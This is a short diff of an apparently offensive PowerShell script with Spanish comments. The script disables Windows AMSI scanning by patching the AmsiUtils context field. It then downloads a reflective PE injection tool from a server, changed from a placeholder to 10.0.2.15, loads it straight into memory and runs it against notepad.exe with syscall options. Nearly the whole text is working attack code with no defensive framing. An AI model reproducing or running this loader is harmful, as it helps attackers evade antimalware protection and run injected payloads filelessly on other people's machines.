@@ -3,8 +3,11 @@ $a = [Ref].Assembly.GetTypes() | ? { $_.Name -like "*AmsiUtils" }
 $f = $a.GetFields('NonPublic,Static') | ? { $_.Name -like "*Context" }
 $f.SetValue($null, [IntPtr]::Zero)
 
-# Descargar y cargar SRPI directamente desde memoria
-$url = "http://TU_SERVIDOR/SharpReflectivePEInjection.exe"
+# Descarga SRPI desde tu server
+$url = "http://10.0.2.15/SR.exe"
 $bytes = (New-Object Net.WebClient).DownloadData($url)
+
+# Carga y ejecuta SRPI con argumentos
 $asm = [System.Reflection.Assembly]::Load($bytes)
-$asm.EntryPoint.Invoke($null, @(,@("-file", "C:\Windows\System32\notepad.exe", "-syscalls")))
+$args = [string[]]@("-file", "C:\Windows\System32\notepad.exe", "-syscalls")
+$asm.EntryPoint.Invoke($null, @(, $args))
